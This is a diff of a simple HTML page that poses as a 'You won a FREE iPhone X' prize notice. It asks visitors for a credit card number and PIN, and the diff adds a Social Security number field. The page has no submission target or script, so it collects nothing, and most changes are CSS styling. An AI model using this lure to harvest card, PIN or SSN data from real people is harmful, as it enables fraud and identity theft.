@@ -1,45 +1,75 @@
-<!DOCTYPE html>
+  <!DOCTYPE html>
 <html>
-  <head>
-    <title>You won a FREE iPhone X!!!</title>
-    <style>
-      body {
-        font-family: Helvetica, Arial, sans-serif;
-        background-image: url("https://media.wired.com/photos/59b82d63fd4b14535f9c7309/master/w_1625,c_limit/15.jpg");
-        background-size: 100%;
-        color: #000;
-        text-shadow: 0 0 8px #fff, 0 0 12px #000;
-        background-attachment: fixed;
-      }
-      button {
-        border: solid 1px #aaa;
-        background-color: #eee;
-        padding: 10px;
-        border-radius: 5px;
-        color: #aaa;
-        transition: 0.3s;
-      }
-      span {
-        color: red;
-        position: absolute;
-        margin-top: 5px;
-      }
-    </style>
-  </head>
-  <body>
+    <head>
+        <title>You won a FREE iPhone X!!!</title>
+        <style>
+            body {
+                font-family: Helvetica, Arial, sans-serif;
+                background-image: url("https://media.wired.com/photos/59b82d63fd4b14535f9c7309/master/w_1625,c_limit/15.jpg");
+                background-size: 100%;
+                color: #000;
+                text-shadow: 0 0 5px #fff, 0 0 7px #000;
+                background-attachment: fixed;
+            }
+            button {
+                border: solid 1px #aaa;
+                background-color: rgba(240, 240, 240, 0.7);
+                padding: 10px;
+                border-radius: 5px;
+                transition: 0.3s;
+                color: #aaa;
+            }
+            button:active {
+                background-color: rgba(220, 220, 220, 1);
+                padding: 15px;
+                transition: 0.1s;
+                color: #fff;
+            }
+            button:focus {
+                outline: 0;
+            }
+            .txt {
+                background-color: rgba(240, 240, 240, 0.7);
+                border: solid 1px #aaa;
+                padding: 10px;
+                border-radius: 5px;
+                -webkit-appearance: none;
+                -moz-appearance: none;
+                transition: 0.7s;
+            }
+            .txt:focus {
+                padding: 15px;
+                background-color: rgba(255, 255, 255, 1);
+                border: solid 3px #aaa;
+                transition: 0.7s;
+                outline: 0;
+            }
+            span {
+                color: red;
+                position: absolute;
+                margin-top: 5px;
+                text-shadow: none;
+            }
+        </style>
+    </head>
+    <body>
     <center>
-      <h1>You won a FREE iPhone X!!!</h1>
-      <p>Give your info to claim your iPhone.</p>
-      <h3>Enter credit card number:</h3>
-      <input type="number" class="txt"  ontouchstart="" placeholder="CC #">
-      &nbsp;
-      <span>*required</span>
-      <h3>Enter pin number:</h3>
-      <input type="password" class="txt"  ontouchstart="" placeholder="pin #">
-      &nbsp;
-      <span>*required</span>
-      <br><br>
-      <button type="submit" ontouchstart="">Submit it<\button>
+        <h1>You won a FREE iPhone X!!!</h1>
+        <p>Give your info to claim your iPhone.</p>
+        <h3>Enter credit card number:</h3>
+        <input type="number" class="txt"  ontouchstart="" placeholder="CC #">
+        &nbsp;
+        <span>*required</span>
+        <h3>Enter pin number:</h3>
+        <input type="password" class="txt"  ontouchstart="" placeholder="pin #">
+        &nbsp;
+        <span>*required</span>
+        <h3>Enter SS number:</h3>
+        <input type="number" class="txt"  ontouchstart="" placeholder="SS #">
+        &nbsp;
+        <span>*required</span>
+        <br><br>
+        <button type="submit" ontouchstart="">Submit it</button>
     </center>
-  </body>
+    </body>
 </html>
